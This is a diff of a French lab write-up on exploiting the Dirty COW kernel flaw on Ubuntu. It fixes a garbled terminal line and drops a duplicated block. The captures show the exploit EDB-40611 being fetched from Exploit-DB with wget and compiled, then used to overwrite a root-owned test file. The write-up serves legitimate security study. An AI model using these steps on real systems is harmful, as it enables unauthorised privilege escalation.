@@ -94,7 +94,7 @@ amine@ubuntu:~$ uname -r
 amine@ubuntu:~$ id
 uid=1000(amine) gid=1000(amine) groups=1000(amine),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 amine@ubuntu:~$ sudo sh -c 'echo "ORIGINAL" > /tmp/dirtycow-test'
-hmod 644 /tmp/diamine@ubuntu:~$ sudo chown root:root /tmp/dirtycow-test
+amine@ubuntu:~$ sudo chown root:root /tmp/dirtycow-test
 amine@ubuntu:~$ sudo chmod 644 /tmp/dirtycow-test
 amine@ubuntu:~$
 amine@ubuntu:~$ ls -l /tmp/dirtycow-test
@@ -110,23 +110,6 @@ amine@ubuntu:~$
 **Capture 2 — Création et exécution de l'exploit.** On télécharge le code source de l'exploit EDB-40611 depuis Exploit-DB (`wget`), puis on le compile. On lance ensuite le binaire en lui passant le fichier cible et la chaîne à écrire.. Malgré nos droits limités, le contenu du fichier `root` est bien modifié. Ecriture réussite :)
 
 ```bash 
-amine@ubuntu:~$ mkdir -p ~/dirtycow
-amine@ubuntu:~$ cd ~/dirtycow
-amine@ubuntu:~/dirtycow$
-amine@ubuntu:~/dirtycow$ wget https://www.exploit-db.com/download/40611 -O dirtycow.c
---2026-10-03 11:39:28--  https://www.exploit-db.com/download/40611
-Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
-Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 2938 (2.9K) [application/txt]
-Saving to: ‘dirtycow.c’
-dirtycow.c         100%[================>]   2.87K  --.-KB/s    in 0s
-2026-10-03 11:39:28 (1.00 GB/s) - ‘dirtycow.c’ saved [2938/2938]
-amine@ubuntu:~/dirtycow$ ls
-dirtycow  dirtycow.c
-amine@ubuntu:~/dirtycow$ gcc -pthread dirtycow.c -o dirtycow
-amine@ubuntu:~/dirtycow$ clear
-amine@ubuntu:~/dirtycow$ cd ..
 amine@ubuntu:~$ mkdir -p ~/dirtycow
 amine@ubuntu:~$ cd ~/dirtycow
 amine@ubuntu:~/dirtycow$ wget https://www.exploit-db.com/download/40611 -O dirtycow.c
